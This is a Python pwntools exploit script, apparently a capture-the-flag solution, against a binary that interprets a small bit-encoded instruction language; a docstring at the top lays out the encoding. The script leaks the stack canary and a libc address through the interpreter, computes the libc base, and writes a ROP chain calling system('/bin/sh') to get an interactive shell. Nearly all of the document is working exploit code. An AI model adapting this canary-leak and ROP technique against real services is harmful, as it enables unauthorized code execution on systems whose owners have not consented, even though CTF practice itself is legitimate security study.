'''
000 <
001 >
010 +
011 -
100 go back x instructions
101 flip one bit
110 inp
111 out
<-

   1   1   0   0   0   0   0    1   1   0   0   1   1   1   1   1   0   1   1   1   0   0   1   1   0   1   0   1   0   1   1   0

000 001 010 001 000 111 110  101 (7)
                         7   100
			     100 101 (1)
			         111 000 111 110 111 000 001 010 011 010 011 100 (11)
			     	   	                                         101 (1)
						 		                 111 110 101 (2)
						    	                                 001 010 011 010 011 010 011 010 011 100 (9)
                                                                                                                                 011
'''

from pwn import *

###Util
def leak(length):
    leaks = b''
    for i in range(length):
        #print(i)
        leaks += p8((r.recvuntil(b'\xc6\x92\n').split(b'\xc6\x92')[1][1]+0xff)&0xff)
        r.sendlineafter('token : ',b'\x07')
        r.sendlineafter('number : ','0')
    r.sendlineafter('token : ',b'\x00')
    r.sendlineafter('number : ','0')
    return leaks

def move_ptr_left(length):
    for i in range(length):
        r.sendlineafter('number : ','1')
        r.sendlineafter('token : ',b'\x0c')
    r.sendlineafter('number : ','1')
    r.sendlineafter('token : ','\x00')

def write_data(payload):
    for i in payload:
        r.sendlineafter('number : ','1')
        r.sendlineafter('token : ',p8(i))
        r.sendlineafter('number : ','2')

###Addr
#  libc2.31
libc_start_offset = 0x26fc0+243
system_offset = 0x55410
bin_sh_offset = 0x1b75aa

###ROPgadget
L_nop = 0x3491f
L_pop_rdi = 0x26b72

###Exploit
r = process('./W',env={'LD_PRELOAD':'./libc-2.31.so'})

num = int('11000001100111110111001101010110'[::-1],2)
r.sendlineafter('fortune : ',str(num))
leaks = leak(1055)
canary = u64(leaks[1031:1039])
print(hex(canary))
libc_start_addr = u64(leaks[1047:1055])
libc_base = libc_start_addr-libc_start_offset
print(hex(libc_base))

move_ptr_left(55)

canary = p64(canary)
padding = b'\x00'*8
ROPchain  = p64(libc_base+L_nop)+\
            p64(libc_base+L_pop_rdi)+p64(libc_base+bin_sh_offset)+\
            p64(libc_base+system_offset)
padding2 = b'\x00'*8
payload = canary+padding+ROPchain+padding2
input()
write_data(payload)

r.interactive()
